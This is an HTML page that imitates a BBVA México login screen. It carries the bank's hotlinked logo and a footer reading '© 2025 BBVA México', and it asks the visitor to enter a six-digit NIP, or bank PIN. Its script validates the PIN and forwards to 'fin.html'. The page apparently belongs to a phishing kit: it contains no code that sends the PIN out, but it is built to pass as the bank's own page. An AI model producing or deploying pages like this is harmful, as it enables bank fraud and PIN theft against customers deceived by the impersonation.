<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>BBVA | Ingresar NIP</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
    }
    header {
      background-color: #001f5b;
      color: white;
      padding: 15px 20px;
      display: flex;
      align-items: center;
    }
    header img {
      height: 30px;
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
    }
    h1 {
      text-align: center;
      color: #000;
      font-weight: normal;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-top: 10px;
      font-size: 16px;
    }
    .error-message {
      color: #e74c3c;
      font-size: 14px;
      margin-top: 5px;
      display: none;
    }
    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
      width: 100%;
      font-size: 16px;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: gray;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://www.bbva.com/wp-content/themes/bbva2017/assets/img/logos/bbva-logo.png" alt="BBVA Logo" />
  </header>

  <div class="container">
    <h1>Ingresa tu NIP</h1>
    <form onsubmit="return verificarNip(event)">
      <input type="password" id="nip" placeholder="Contraseña" maxlength="200" />
      <div class="error-message" id="error">Ingresa una Contraseña</div>
      <button type="submit">Aceptar</button>
    </form>
    <div class="footer">
      © 2025 BBVA México. 
    </div>
  </div>

  <script>
    function verificarNip(e) {
      e.preventDefault();
      const nip = document.getElementById('nip').value.trim();
      const errorDiv = document.getElementById('error');
      if (nip.length === 6 && /^\d+$/.test(nip)) {
        errorDiv.style.display = 'none';
        window.location.href = 'fin.html';
      } else {
        errorDiv.style.display = 'block';
      }
      return false;
    }
  </script>
</body>
</html>
